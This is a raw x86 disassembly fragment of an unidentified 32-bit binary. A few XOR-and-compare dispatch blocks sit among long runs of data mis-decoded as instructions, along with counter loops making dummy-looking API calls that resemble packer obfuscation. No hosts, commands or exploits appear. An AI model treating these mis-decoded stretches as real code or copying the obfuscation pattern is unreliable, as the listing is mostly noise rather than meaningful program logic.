  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x4336eb,0x43366f
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x4336e7,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	ja     0x4051bf
  405186:	add    al,0x8f
  405188:	hlt    
  405189:	sub    BYTE PTR [esi+0x7e],bh
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x4051b4
  405191:	std    
  405192:	cmp    DWORD PTR [esi],esp
  405194:	or     DWORD PTR [edi+0x7],0xa77c9c39
  40519b:	mov    esp,0xed44683a
  4051a0:	in     al,0x69
  4051a2:	cdq    
  4051a3:	dec    edx
  4051a4:	cwde   
  4051a5:	data16 sar BYTE PTR ds:0xbe0f040d,1
  4051ac:	and    DWORD PTR [ebx+0x72ef2e82],esi
  4051b2:	jp     0x405195
  4051b4:	(bad)
  4051b7:	and    dh,BYTE PTR [edi-0x3f]
  4051ba:	test   esi,eax
  4051bc:	and    DWORD PTR [esi+0x28],0x7b03efba
  4051c3:	pop    ebx
  4051c4:	push   es
  4051c5:	jbe    0x4051c8
  4051c7:	lods   eax,DWORD PTR ds:[esi]
  4051c8:	call   FWORD PTR [eax+0x64]
  4051cb:	pop    ebx
  4051cc:	mul    BYTE PTR [ecx-0x63]
  4051cf:	dec    ecx
  4051d0:	mov    ch,0x2c
  4051d2:	pop    ds
  4051d3:	in     al,dx
  4051d4:	dec    eax
  4051d5:	jmp    DWORD PTR [ebx+0x425838e7]
  4051db:	mov    bl,0xc2
  4051dd:	ret    0x9b26
  4051e0:	shl    DWORD PTR [ecx+edx*8],1
  4051e3:	fsub   DWORD PTR cs:[ebx+ebx*2]
  4051e7:	mov    esi,0xafef6d33
  4051ec:	rol    DWORD PTR [ebx-0x647dfe78],0x48
  4051f3:	(bad)  
  4051f4:	or     eax,0xb8c2ef92
  4051f9:	lds    esi,FWORD PTR [eax+0x46]
  4051fc:	div    BYTE PTR [edx+0x70]
  4051ff:	inc    ecx
  405200:	pop    edx
  405201:	retf   0x8a1a
  405204:	cs ret 
  405206:	ins    BYTE PTR es:[edi],dx
  405207:	add    al,0x52
  405209:	outs   dx,DWORD PTR ds:[esi]
  40520a:	mov    ecx,0x88afc31
  40520f:	fld    TBYTE PTR [eax+0x5c5023e9]
  405215:	outs   dx,BYTE PTR ds:[esi]
  405216:	dec    ebp
  405217:	jno    0x4051c4
  405219:	sti    
  40521a:	ins    BYTE PTR es:[edi],dx
  40521b:	shr    DWORD PTR [edx+0x41],cl
  40521e:	fbstp  TBYTE PTR [edi+0x42]
  405221:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405222:	aad    0xb0
  405224:	xor    DWORD PTR [edx+0x4edbf42f],0xbd27e965
  40522e:	(bad)  
  40522f:	xchg   ebx,eax
  405230:	mov    dh,0x6c
  405232:	jno    0x40522d
  405234:	jb     0x4051e0
  405236:	in     eax,dx
  405237:	out    0x33,eax
  405239:	mov    ecx,0x7a9eac91
  40523e:	mov    esp,0xb0203416
  405243:	mov    ds:0xa511531,eax
  405248:	adc    esp,DWORD PTR [edi]
  40524a:	sbb    BYTE PTR [esi+0x11484160],0xda
  405251:	jbe    0x405263
  405253:	iret   
  405254:	cld    
  405255:	adc    cl,BYTE PTR [esi-0x53]
  405258:	pop    ds
  405259:	(bad)  
  40525a:	mov    bh,0x48
  40525c:	push   ss
  40525d:	push   edx
  40525e:	out    0x14,eax
  405260:	push   edx
  405261:	out    dx,eax
  405262:	sbb    al,0xae
  405264:	pop    es
  405265:	js     0x40528d
  405267:	iret   
  405268:	and    edi,DWORD PTR [eax+eax*4-0x64ca38eb]
  40526f:	or     dl,ah
  405271:	pop    edi
  405272:	shl    DWORD PTR [ebx],1
  405274:	aad    0xa6
  405276:	jns    0x405248
  405278:	js     0x4052ee
  40527a:	sbb    al,0xcb
  40527c:	mov    cl,0x5a
  40527e:	sub    esi,DWORD PTR [edx+eax*4-0x26d4d16]
  405285:	add    DWORD PTR [ecx],ebx
  405287:	ja     0x405250
  405289:	in     al,0x14
  40528b:	xchg   esp,eax
  40528c:	shr    ebp,1
  40528e:	ret    
  40528f:	mov    ebp,0xf456bf7
  405294:	jae    0x40523a
  405296:	int    0x56
  405298:	mov    eax,0x331d17af
  40529d:	(bad)  
  40529e:	idiv   ebp
  4052a0:	or     DWORD PTR [ebp+ebp*8+0x52],edx
  4052a4:	in     al,0xd3
  4052a6:	dec    ebx
  4052a7:	into   
  4052a8:	or     DWORD PTR [edx],0xffffff90
  4052ab:	jns    0x405236
  4052ad:	cmp    eax,0xddff16df
  4052b2:	stc    
  4052b3:	and    eax,0xe57f9f37
  4052b8:	int    0xf4
  4052ba:	mov    ebp,0xee976c1a
  4052bf:	push   edx
  4052c0:	inc    esi
  4052c1:	pop    esp
  4052c2:	pop    esp
  4052c3:	or     al,0xb
  4052c5:	mov    bl,0x7c
  4052c7:	xor    al,0xe0
  4052c9:	fimul  WORD PTR [ecx-0x6c]
  4052cc:	push   0xffffff82
  4052ce:	add    ebx,edx
  4052d0:	hlt    
  4052d1:	push   esp
  4052d2:	mov    di,0x6e59
  4052d6:	fs pushf 
  4052d8:	mov    BYTE PTR [ebx-0x4acd4c12],bl
  4052de:	or     BYTE PTR [eax],ah
  4052e0:	rcr    DWORD PTR [edi],0xc2
  4052e3:	cdq    
  4052e4:	xor    ecx,DWORD PTR [edi+0x2e]
  4052e7:	std    
  4052e8:	(bad)  
  4052e9:	scas   eax,DWORD PTR es:[edi]
  4052ea:	rcr    dh,cl
  4052ec:	mov    al,BYTE PTR [edx-0x3257026e]
  4052f2:	pusha  
  4052f3:	pop    gs
  4052f5:	test   ebx,ebx
  4052f7:	jmp    FWORD PTR [esi-0x312854a0]
  4052fd:	sub    bl,BYTE PTR [esp+ecx*8+0x22]
  405301:	push   edx
  405302:	dec    esp
  405303:	(bad)  
  405305:	jo     0x40536a
  405307:	mov    edx,0x889a7914
  40530c:	xchg   DWORD PTR [ebx],edi
  40530e:	lahf   
  40530f:	imul   ebp,DWORD PTR [edi+0x38454d94],0x6f
  405316:	mov    bh,ch
  405318:	push   eax
  405319:	and    DWORD PTR [edx+0x66],ebp
  40531c:	push   0xac73aca1
  405321:	jo     0x405305
  405323:	aam    0x8d
  405325:	add    eax,0xbdea5e89
  40532a:	imul   ecx,esp,0x77029ac3
  405330:	sahf   
  405331:	xor    bh,al
  405333:	(bad)  
  405334:	push   edx
  405335:	adc    bl,cl
  405337:	mov    bh,0x0
  405339:	cmp    eax,0xc02739c6
  40533e:	sar    DWORD PTR [edi],0x31
  405341:	xor    BYTE PTR [edi+0x31],0x33
  405345:	push   ebx
  405346:	mov    bh,0xe8
  405348:	push   eax
  405349:	mov    ds:0xecb9775d,eax
  40534e:	adc    cl,dl
  405350:	or     BYTE PTR [esi-0x7cbcdab0],al
  405356:	sahf   
  405357:	bound  ebp,QWORD PTR [edx]
  405359:	inc    edi
  40535a:	sub    dh,dl
  40535c:	jbe    0x4053bb
  40535e:	xor    al,0xc8
  405360:	or     DWORD PTR [edi+0x65],edx
  405363:	pop    ebx
  405364:	or     eax,0x657e1d6d
  405369:	dec    esi
  40536a:	push   edx
  40536b:	into   
  40536c:	inc    ebx
  40536d:	out    dx,eax
  40536e:	xchg   esi,eax
  40536f:	jmp    0x7b103bd5
  405374:	mov    ch,0xcb
  405376:	mov    edi,0x62bbd3d1
  40537b:	add    dh,BYTE PTR [ebx+0x36]
  40537e:	daa    
  40537f:	jmp    0x72c7971a
  405384:	jnp    0x405379
  405386:	std    
  405387:	sub    bl,dh
  405389:	or     esi,DWORD PTR [bp+0x66cf]
  40538e:	and    BYTE PTR [eax+eiz*2],dh
  405391:	dec    edi
  405392:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405393:	mov    ecx,0x73426e58
  405398:	(bad)  
  405399:	xor    BYTE PTR [edi-0x79ab6a9],bh
  40539f:	sahf   
  4053a0:	js     0x4053fc
  4053a2:	stos   DWORD PTR es:[edi],eax
  4053a3:	jle    0x40535a
  4053a5:	(bad)  [esi]
  4053a7:	add    edx,DWORD PTR [ebx-0x42]
  4053aa:	pop    ebx
  4053ab:	xchg   DWORD PTR ds:0xcf94465f,ebx
  4053b1:	xchg   BYTE PTR ds:0xfa5e5be2,dh
  4053b7:	leave  
  4053b8:	pop    ecx
  4053b9:	ds jl  0x405419
  4053bc:	sub    DWORD PTR [ecx-0x449bbc4a],edx
  4053c2:	dec    edx
  4053c3:	mov    ds:0x40b40c6e,eax
  4053c8:	push   0xbaceb9f
  4053cd:	les    edx,FWORD PTR [esi-0x74]
  4053d0:	xchg   esp,eax
  4053d1:	mov    ds:0x5cf5847,al
  4053d6:	fdivr  st,st(3)
  4053d8:	push   es
  4053d9:	addr16 in eax,dx
  4053db:	loop   0x405439
  4053dd:	mov    eax,0xa2c9d8e5
  4053e2:	lahf   
  4053e3:	push   0x79a36a40
  4053e8:	adc    al,0x30
  4053ea:	pop    ebx
  4053eb:	pop    ds
  4053ec:	dec    esp
  4053ed:	fdiv   DWORD PTR [eax+0x55]
  4053f0:	shr    DWORD PTR [esp+edi*8],cl
  4053f3:	xchg   edi,eax
  4053f4:	and    ebx,ebp
  4053f6:	mov    dl,0x1a
  4053f8:	mov    ah,0x53
  4053fa:	jl     0x40546b
  4053fc:	gs stc 
  4053fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4053ff:	push   edx
  405400:	xchg   ebp,eax
  405401:	push   ds
  405402:	popa   
  405403:	cdq    
  405404:	push   es
  405405:	xchg   esi,eax
  405406:	xchg   DWORD PTR [edx],ebp
  405408:	sti    
  405409:	ss cmp eax,0x896f1031
  40540f:	and    al,0x24
  405411:	push   ss
  405412:	sbb    cl,BYTE PTR [ecx]
  405414:	mov    DWORD PTR [esi],eax
  405416:	adc    esp,DWORD PTR [ebx]
  405418:	add    esi,DWORD PTR [ebx]
  40541a:	data16 adc bh,BYTE PTR gs:[ecx+0x10e05fea]
  405422:	dec    edx
  405423:	cmp    DWORD PTR [eax+0x13],ecx
  405426:	pushf  
  405427:	js     0x4053d7
  405429:	sub    BYTE PTR [edx-0x5e8edcd4],dl
  40542f:	fisttp DWORD PTR [eax]
  405431:	bound  edx,QWORD PTR [eax]
  405433:	clc    
  405434:	mov    al,0xf8
  405436:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405437:	jno    0x405437
  405439:	mov    al,0xba
  40543b:	loopne 0x405467
  40543d:	mov    edi,0xa6b2b439
  405442:	cmp    BYTE PTR [esi-0x4a],al
  405445:	(bad)  
  405446:	xor    al,BYTE PTR [esi-0x53]
  405449:	scas   al,BYTE PTR es:[edi]
  40544a:	ror    eax,cl
  40544c:	jg     0x405475
  40544e:	stos   BYTE PTR es:[edi],al
  40544f:	xor    esp,esp
  405451:	mov    ch,0x64
  405453:	int    0x1e
  405455:	and    ecx,DWORD PTR [ecx+ecx*2+0x2]
  405459:	xor    dl,BYTE PTR [ebx+eiz*8]
  40545c:	jbe    0x4054bd
  40545e:	push   ds
  40545f:	mov    esp,0x88f403fd
  405464:	test   edi,ebx
  405466:	or     BYTE PTR [ebx],ch
  405468:	dec    esi
  405469:	(bad)  
  40546a:	test   BYTE PTR [edi+0x34],0x5b
  40546e:	inc    ebp
  40546f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405470:	adc    bh,BYTE PTR [eax+esi*4+0x5d]
  405474:	cdq    
  405475:	iret   
  405476:	jb     0x405485
  405478:	cmc    
  405479:	inc    ebp
  40547a:	sub    dl,al
  40547c:	mov    esi,0x5016015e
  405481:	inc    ebp
  405482:	mov    ds:0xfeaaa0ab,eax
  405487:	mov    BYTE PTR [esi+0x14ebbd7e],dl
  40548d:	mov    es,esi
  40548f:	dec    eax
  405490:	lds    edi,FWORD PTR [ecx+0x70237cff]
  405496:	or     eax,0x53ba8570
  40549b:	sbb    eax,DWORD PTR [esi-0x46]
  40549e:	icebp  
  40549f:	sbb    eax,0x30cd544d
  4054a4:	fs add al,0x4d
  4054a7:	sahf   
  4054a8:	sahf   
  4054a9:	push   cs
  4054aa:	shr    al,1
  4054ac:	jo     0x405500
  4054ae:	mov    bl,0x9a
  4054b0:	int3   
  4054b1:	adc    BYTE PTR [edx],bh
  4054b3:	pop    esi
  4054b4:	lock mov dh,0xb4
  4054b7:	jge    0x405516
  4054b9:	test   BYTE PTR [esp+ecx*4],bh
  4054bc:	push   eax
  4054bd:	mov    bl,0x25
  4054bf:	mov    edx,DWORD PTR [ebp-0x49c00b39]
  4054c5:	mov    ds:0x92232f77,eax
  4054ca:	adc    al,0x3
  4054cc:	push   ebx
  4054cd:	add    edx,ecx
  4054cf:	jmp    0x4063ea
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x4336e7
  4054e3:	or     DWORD PTR ds:0x433703,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x4336f3,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x4336f3
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x4336f3,ebx
  405504:	cmp    DWORD PTR ds:0x4336f3,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x4336f3,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x4336f3
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x4336f3,ebx
  405545:	cmp    DWORD PTR ds:0x4336f3,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x4336f7,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x4336b7,0x0
  405570:	mov    ebx,DWORD PTR ds:0x4336b7
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x4336b7,ebx
  40557d:	cmp    DWORD PTR ds:0x4336b7,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x433846
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x4336b7,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0x7e3df84f
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x405685
  40563a:	sub    DWORD PTR [edi+0x65],ebx
  40563d:	or     eax,0x92877de0
  405642:	pushf  
  405643:	lock and dh,BYTE PTR [eax*2-0x2b13c969]
  40564b:	outs   dx,BYTE PTR ds:[esi]
  40564c:	or     DWORD PTR [ebp-0x36],ebx
  40564f:	int3   
  405650:	xchg   BYTE PTR [esi],dh
  405652:	adc    eax,0x500e45cd
  405657:	xor    al,0xb9
  405659:	call   0x3d1d472c
  40565e:	aad    0x9b
  405660:	add    BYTE PTR ds:0x4220076a,bh
  405666:	dec    edx
  405667:	in     al,dx
  405668:	ds jb  0x40562b
  40566b:	xchg   esp,eax
  40566c:	aad    0x13
  40566e:	or     eax,0xa46de6f5
  405673:	scas   al,BYTE PTR es:[edi]
  405674:	loope  0x405637
  405676:	ins    BYTE PTR es:[edi],dx
  405677:	lods   al,BYTE PTR ds:[esi]
  405678:	jmp    0x4056bf
  40567a:	out    0xe,al
  40567c:	or     BYTE PTR [ebp+0x5f],cl
  40567f:	push   0x1d807229
  405684:	loopne 0x40560a
  405686:	jns    0x4056d4
  405688:	push   ecx
  405689:	in     eax,0x54
  40568b:	popf   
  40568c:	sbb    DWORD PTR [ecx+eax*4],edx
  40568f:	sub    edi,DWORD PTR [esi+0x50895f0d]
  405695:	lahf   
  405696:	adc    dh,cl
  405698:	xor    ah,BYTE PTR ds:0x763c0ffe
  40569e:	adc    ch,BYTE PTR [ebx+0x4c]
  4056a1:	mov    edx,0x90cadd32
  4056a6:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4056a8:	rcl    DWORD PTR [esi+ecx*2+0x1a],cl
  4056ac:	or     eax,0xc6784479
  4056b1:	clc    
  4056b2:	jns    0x405684
  4056b4:	xor    DWORD PTR [edi+0x349cd18c],eax
  4056ba:	inc    eax
  4056bb:	adc    edi,DWORD PTR [edx+0x6c]
  4056be:	in     al,0x24
  4056c0:	push   ebx
  4056c1:	pop    ss
  4056c2:	push   cs
  4056c3:	(bad)  
  4056c4:	xchg   esp,eax
  4056c5:	push   ebp
  4056c6:	cmp    DWORD PTR [ebp-0x39],edi
  4056c9:	xchg   edx,eax
  4056ca:	(bad)  
  4056cb:	or     bl,ch
  4056cd:	add    eax,DWORD PTR [eax]
  4056cf:	and    bl,BYTE PTR [edx+0x2f3141ee]
  4056d5:	fs pop esi
  4056d7:	push   edx
  4056d8:	xchg   esi,eax
  4056d9:	mov    bl,0x17
  4056db:	push   esi
  4056dc:	push   ecx
  4056dd:	pop    edi
  4056de:	add    BYTE PTR [ebx-0xa],0x37
  4056e2:	lock ins DWORD PTR es:[edi],dx
  4056e4:	rcl    DWORD PTR [edx+ecx*1],1
  4056e7:	adc    cl,BYTE PTR [ebx+0x7c]
  4056ea:	mul    DWORD PTR [ebx+0x3da879c2]
  4056f0:	jnp    0x40573d
  4056f2:	pop    eax
  4056f3:	ret    
  4056f4:	dec    edx
  4056f5:	mov    esp,DWORD PTR [esi+0x2afeba28]
  4056fb:	sbb    eax,0x4be0251c
  405700:	inc    edi
  405701:	jle    0x4056ea
  405703:	inc    ebx
  405704:	sbb    DWORD PTR [edi+0x75],ebp
  405707:	xchg   BYTE PTR [edi],bl
  405709:	cs adc eax,0x66454d99
  40570f:	push   edx
  405710:	scas   eax,DWORD PTR es:[edi]
  405711:	rcr    DWORD PTR [esp+esi*2-0x27313332],1
  405718:	mov    ds:0x4036e9db,al
  40571d:	stos   BYTE PTR es:[edi],al
  40571e:	pop    edi
  40571f:	shl    esp,1
  405721:	or     DWORD PTR [ebx+ebp*8-0x18906d29],ecx
  405728:	loopne 0x4056f6
  40572a:	push   esp
  40572b:	and    eax,0x71730bc2
  405730:	mov    ebx,0x11995cd
  405735:	sub    eax,0x6ff6d88
  40573a:	push   cs
  40573b:	dec    esi
  40573c:	outs   dx,DWORD PTR ds:[esi]
  40573d:	gs shr al,cl
  405740:	(bad)  
  405741:	fiadd  WORD PTR [ecx]
  405743:	stgi   
  405746:	jp     0x4056ef
  405748:	fidivr WORD PTR [ebp+0x32]
  40574b:	out    dx,al
  40574c:	pop    es
  40574d:	test   al,0x74
  40574f:	mov    ebx,DWORD PTR [eax-0x2588a229]
  405755:	leave  
  405756:	pop    ss
  405757:	jecxz  0x40572e
  405759:	std    
  40575a:	addr16 lock dec esi
  40575d:	jne    0x4056ec
  40575f:	or     ch,bh
  405761:	mov    cl,0x3b
  405763:	mov    eax,es
  405765:	push   cs
  405766:	jns    0x4057a5
  405768:	mov    bl,0xad
  40576a:	pop    es
  40576b:	imul   eax,DWORD PTR [eax+0x79],0xffffffa7
  40576f:	shl    DWORD PTR [edi+0x67],0x1a
  405773:	push   0x598be385
  405778:	(bad)  
  405779:	adc    edi,DWORD PTR [edx-0x5d2497b5]
  40577f:	push   eax
  405780:	ss stos DWORD PTR es:[edi],eax
  405782:	and    BYTE PTR [eax+0x2e8eff67],bh
  405788:	adc    bl,dl
  40578a:	loopne 0x4057a4
  40578c:	fnsave [ecx+eax*1]
  40578f:	adc    al,0x30
  405791:	or     DWORD PTR [eax-0x66a36737],esi
  405797:	cmp    esi,edi
  405799:	test   DWORD PTR [eax],ecx
  40579b:	pop    ds
  40579c:	jl     0x4057db
  40579e:	lea    ebx,[edx]
  4057a0:	jle    0x405809
  4057a2:	fbstp  TBYTE PTR [ebx]
  4057a4:	xchg   edi,eax
  4057a5:	pop    esi
  4057a6:	rcr    al,cl
  4057a8:	fmul   QWORD PTR [ebx+0x45]
  4057ab:	ins    DWORD PTR es:[edi],dx
  4057ac:	in     al,0x9c
  4057ae:	dec    ebp
  4057af:	loopne 0x40573b
  4057b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4057b2:	lods   al,BYTE PTR ds:[esi]
  4057b3:	int    0xfb
  4057b5:	(bad)  
  4057b6:	pop    edi
  4057b7:	dec    esi
  4057b8:	add    ch,al
  4057ba:	push   edx
  4057bb:	sbb    DWORD PTR [edx+0x5437c495],0x7d
  4057c2:	(bad)  
  4057c3:	sti    
  4057c4:	push   es
  4057c5:	dec    esp
  4057c6:	adc    al,0x37
  4057c9:	cmp    BYTE PTR [eax+0x4f],bh
  4057cc:	mov    al,0xb2
  4057ce:	in     eax,0xd0
  4057d0:	or     DWORD PTR [esi-0x4d],0x93c0b13d
  4057d7:	fnsave [eax-0x7c02b445]
  4057dd:	mov    ecx,0x2ccff64
  4057e2:	clc    
  4057e3:	pop    esp
  4057e4:	jge    0x405817
  4057e6:	jmp    0x2f3621e0
  4057eb:	xor    al,0xe6
  4057ed:	in     al,dx
  4057ee:	test   al,0x4f
  4057f0:	sbb    DWORD PTR [esi+0x6c],ebp
  4057f3:	jmp    0x405845
  4057f5:	xchg   ecx,eax
  4057f6:	enter  0x94ed,0x43
  4057fa:	mov    ecx,0x2dbd06cf
  4057ff:	or     al,0xd4
  405801:	inc    ebp
  405802:	and    bl,BYTE PTR [eax-0x72fd3822]
  405808:	fidiv  DWORD PTR [esi]
  40580a:	fdivr  QWORD PTR [ebp+0x7b]
  40580d:	cmp    al,0xa6
  40580f:	mov    ecx,0xfc4042c9
  405814:	pop    ebx
  405815:	hlt    
  405816:	int    0x31
  405818:	jne    0x405821
  40581a:	jne    0x405837
  40581c:	daa    
  40581d:	jmp    0xd6c1b7b4
  405822:	rcr    ecx,1
  405824:	out    0xb5,al
  405826:	jmp    0x34d4:0x1b76bb25
  40582d:	fs inc edx
  40582f:	sbb    DWORD PTR [edi],edx
  405831:	in     eax,dx
  405832:	gs mov cl,0xc7
  405835:	(bad)  
  405836:	in     al,dx
  405837:	les    esp,FWORD PTR [edi-0x3a]
  40583a:	mov    dl,0x8e
  40583c:	xchg   esi,eax
  40583d:	jnp    0x405829
  40583f:	adc    eax,0x142fa73e
  405844:	(bad)  
  405846:	fild   QWORD PTR [ecx-0x21]
  405849:	and    BYTE PTR [ebp+0x7d649bda],bl
  40584f:	fwait
  405850:	mov    ebx,DWORD PTR [edx+0x2]
  405853:	(bad)  
  405854:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405855:	xlat   BYTE PTR ds:[ebx]
  405856:	imul   esi,DWORD PTR [ebx-0x54],0x50
  40585a:	mov    ebx,0xe749d9a9
  40585f:	inc    esi
  405860:	in     eax,dx
  405861:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405862:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405863:	jmp    0x458f:0x18582228
  40586a:	aaa    
  40586b:	push   ss
  40586c:	loop   0x4058df
  40586e:	dec    ecx
  40586f:	or     dh,BYTE PTR [ebp-0x71]
  405872:	jmp    0xcf02:0xbf09c0fe
  405879:	retf   0x8b10
  40587c:	xchg   ebp,eax
  40587d:	nop
  40587e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40587f:	mov    BYTE PTR [edx],bh
  405881:	(bad)  
  405882:	dec    edi
  405883:	stos   DWORD PTR es:[edi],eax
  405884:	out    0xdf,al
  405886:	push   0xfffffffe
  405888:	das    
  405889:	jb     0x405873
  40588b:	xchg   ebx,eax
  40588c:	loop   0x405883
  40588e:	adc    edx,DWORD PTR [ecx-0x6a]
  405891:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405892:	fisubr DWORD PTR [ebp+0x43]
  405895:	adc    al,0x28
  405897:	add    eax,0xc5f4746b
  40589c:	sbb    DWORD PTR [edi+0x27],esi
  40589f:	dec    ebp
  4058a0:	cmp    eax,ebx
  4058a2:	and    eax,esp
  4058a4:	pop    esi
  4058a5:	out    dx,eax
  4058a6:	xchg   edi,eax
  4058a7:	ret    0x1db9
  4058aa:	ret    0xddc5
  4058ad:	and    DWORD PTR [ebx-0x7706edb6],edx
  4058b3:	push   eax
  4058b4:	jne    0x4058b6
  4058b6:	and    BYTE PTR [esi+0x327a6599],ah
  4058bc:	int    0x10
  4058be:	xor    eax,0x43e93aa8
  4058c3:	mov    al,ds:0x8e9f05a3
  4058c8:	xor    al,0xbc
  4058ca:	add    DWORD PTR ds:0xffd48b27,eax
  4058d0:	fwait
  4058d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058d2:	jecxz  0x40586f
  4058d4:	inc    esp
  4058d5:	jns    0x40593c
  4058d7:	push   ss
  4058d8:	inc    edx
  4058d9:	jl     0x40591f
  4058db:	fucomi st,st(5)
  4058dd:	add    ch,BYTE PTR [edx+ecx*2-0x70]
  4058e1:	dec    esi
  4058e2:	into   
  4058e3:	out    0xd,al
  4058e5:	div    BYTE PTR [edx-0x52ec9b49]
  4058eb:	popa   
  4058ec:	scas   al,BYTE PTR es:[edi]
  4058ed:	icebp  
  4058ee:	retf   
  4058ef:	outs   dx,BYTE PTR ds:[esi]
  4058f0:	push   esi
  4058f1:	and    bh,BYTE PTR [ebx-0x7d528df]
  4058f7:	mov    ah,0x56
  4058f9:	aam    0x97
  4058fb:	dec    ebp
  4058fc:	xor    edi,DWORD PTR [edi]
  4058fe:	and    dh,0xf3
  405901:	ret    
  405902:	xor    eax,0xb2de3518
  405907:	mov    bl,0x29
  405909:	ins    BYTE PTR es:[edi],dx
  40590a:	pop    esp
  40590b:	in     al,dx
  40590c:	enter  0xc6c7,0x72
  405910:	cmp    al,0xa4
  405912:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405913:	jae    0x4058c3
  405915:	xor    DWORD PTR [ebx+ebp*8-0x1e],edx
  405919:	xor    eax,0x6f4315a8
  40591e:	add    BYTE PTR ds:0xce565281,dl
  405924:	lods   al,BYTE PTR ds:[esi]
  405925:	div    DWORD PTR [esi+ecx*1]
  405928:	fld    QWORD PTR [esi+0x10]
  40592b:	cs adc eax,0xcd4b2a58
  405931:	jno    0x4058b8
  405933:	int    0x61
  405935:	mov    ah,cl
  405937:	fadd   st,st(5)
  405939:	xor    al,0xb1
  40593b:	cmp    esp,ebp
  40593d:	adc    DWORD PTR [esi+0x646a7d1d],ecx
  405943:	cmp    eax,0xfd1924a8
  405948:	fmul   st(3),st
  40594a:	add    eax,0x554a6dea
  40594f:	inc    ebx
  405950:	mov    dh,0xf5
  405952:	pop    edx
  405953:	sub    al,0x4
  405955:	mov    esp,0x1b072a3c
  40595a:	arpl   di,dx
  40595c:	mov    al,ds:0x99f24a73
  405961:	mov    DWORD PTR [esi],esi
  405963:	cmp    ebx,0x9ff53479
  405969:	(bad)  
  40596a:	cmp    eax,0xbe9e0b4e
  40596f:	push   edi
  405970:	cmp    cl,BYTE PTR [eax-0x169d8bd3]
  405976:	mov    edx,DWORD PTR [ebp-0x30]
  405979:	jmp    0x4063dc
  40597e:	mov    edx,DWORD PTR [ebp-0x38]
  405981:	mov    edi,DWORD PTR [ebp-0x4]
  405984:	xor    edx,eax
  405986:	xor    edi,eax
  405988:	add    edi,ecx
  40598a:	add    edx,ecx
  40598c:	imul   edx,edi
  40598f:	mov    edi,DWORD PTR [ebp-0x8]
  405992:	mov    ebx,DWORD PTR [ebp-0x10]
  405995:	sub    ebx,edi
